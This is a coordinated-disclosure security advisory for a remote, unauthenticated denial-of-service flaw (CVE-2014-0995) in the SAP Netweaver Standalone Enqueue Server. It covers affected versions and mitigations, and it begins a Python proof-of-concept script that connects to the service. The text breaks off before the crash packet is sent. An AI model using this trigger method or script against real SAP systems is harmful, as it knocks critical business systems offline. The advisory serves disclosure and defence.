SAP Netweaver Enqueue Server Trace Pattern Denial of Service Vulnerability

1. **Advisory Information**

Title: SAP Netweaver Enqueue Server Trace Pattern Denial of Service
Vulnerability
Advisory ID: CORE-2014-0007
Advisory URL:
http://www.coresecurity.com/advisories/sap-netweaver-enqueue-server-trace-pattern-denial-service-vulnerability
Date published: 2014-10-15
Date of last update: 2014-10-15
Vendors contacted: SAP
Release mode: Coordinated release

2. **Vulnerability Information***
*
Class: Uncontrolled Recursion [CWE-674]
Impact: Denial of service
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2014-0995

3. **Vulnerability Description**

        SAP Netweaver [1] is a technology platform for building and
integrating SAP business
        applications. A vulnerability has been found in SAP Netweaver
that could allow an
        unauthenticated, remote attacker to create denial of service
conditions. The vulnerability
        is triggered by sending a specially crafted SAP Enqueue Server
packet to remote TCP port 32NN
        (NN being the SAP system number) of a host running the
"Standalone Enqueue Server" service, part
        of SAP Netweaver Application Server ABAP/Java. The "Standalone
Enqueue Server" is a critical
        component of a SAP Netweaver installation in terms of
availability, rendering the whole SAP
        system unresponsive.

4. **Vulnerable Packages**

   . SAP Netweaver 7.01 (enserver.exe version v7010.32.15.63503).
   . SAP Netweaver 7.20 (enserver.exe version v7200.70.18.23869).

    Other versions are probably affected too, but they were not checked.

5. **Vendor Information, Solutions and Workarounds**

        Martin Gallo proposed the following actions to mitigate the
impact of the vulnerabilities:

        Restrict access to the Standalone Enqueue service by configuring
Access Control Lists [4] and to
        the Standalone Enqueue Service TCP port 32XX (XX is the instance
number).

        SAP published a security note [3] with the fix.

6. **Credits**

      This vulnerability was discovered and researched by Martin Gallo
from Core Security Consulting
      Services. The publication of this advisory was coordinated by
Joaquín Rodríguez Varela from Core
      Advisories Team.

7. **Technical Description / Proof of Concept Code**

      When the trace level of the service is configured to stop logging
when a pattern is found [2], the
      service does not properly control the amount of recursion
resulting in a stack overflow exception.
      The vulnerability can be triggered remotely by setting the trace
level with a wildcard Trace Pattern.
      This vulnerability could allow a remote, unauthenticated attacker
to conduct a denial of service
      attack against the vulnerable systems, rendering the Enqueue
Server unavailable.

      The following python code can be used to trigger the vulnerability:

7.1. **Proof of Concept**

/-----
import socket, struct
from optparse import OptionParser

# Parse the target options
parser = OptionParser()
parser.add_option("-d", "--hostname", dest="hostname", help="Hostname",
default="localhost")
parser.add_option("-p", "--port", dest="port", type="int", help="Port
number", default=3200)
(options, args) = parser.parse_args()

def send_packet(sock, packet):
    packet = struct.pack("!I", len(packet)) + packet
    sock.send(packet)

# Connect
print "[*] Connecting to", options.hostname, "port", options.port
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect((options.hostname, options.port))

print "[*] Sending crash packet"
